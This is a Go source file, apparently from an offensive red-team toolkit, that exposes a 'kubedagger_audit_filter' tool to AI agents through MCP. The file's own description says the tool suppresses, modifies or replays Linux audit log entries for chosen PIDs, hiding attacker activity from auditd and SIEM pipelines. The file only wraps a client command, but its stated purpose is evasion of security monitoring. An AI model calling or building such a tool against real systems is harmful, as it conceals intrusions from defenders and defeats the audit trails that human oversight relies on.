package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type AuditFilterInput struct {
	Mode string `json:"mode,omitempty"`
	Pids string `json:"pids,omitempty"`
}

type AuditFilterTool struct {
	exec executor.Executor
}

func NewAuditFilter(exec executor.Executor) *AuditFilterTool {
	return &AuditFilterTool{exec: exec}
}

func (t *AuditFilterTool) Name() string { return "kubedagger_audit_filter" }

func (t *AuditFilterTool) Description() string {
	return "Suppress, modify, or replay Linux audit log entries by intercepting audit_log_start. Filters events from specified processes before they reach the audit backend, hiding attacker activity from auditd and SIEM pipelines."
}

func (t *AuditFilterTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"mode": {
				"type": "string",
				"enum": ["suppress", "modify", "replay"],
				"description": "Audit filter mode (default: suppress)"
			},
			"pids": {
				"type": "string",
				"description": "Comma-separated list of PIDs whose audit events are filtered (e.g. '1234,5678')"
			}
		}
	}`)
}

func (t *AuditFilterTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input AuditFilterInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validatePIDList(input.Pids); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"audit-filter"}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}
	if input.Pids != "" {
		args = append(args, "--pids", input.Pids)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger audit-filter failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Audit Filter\n\n")
	if output == "" {
		sb.WriteString("Filter active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
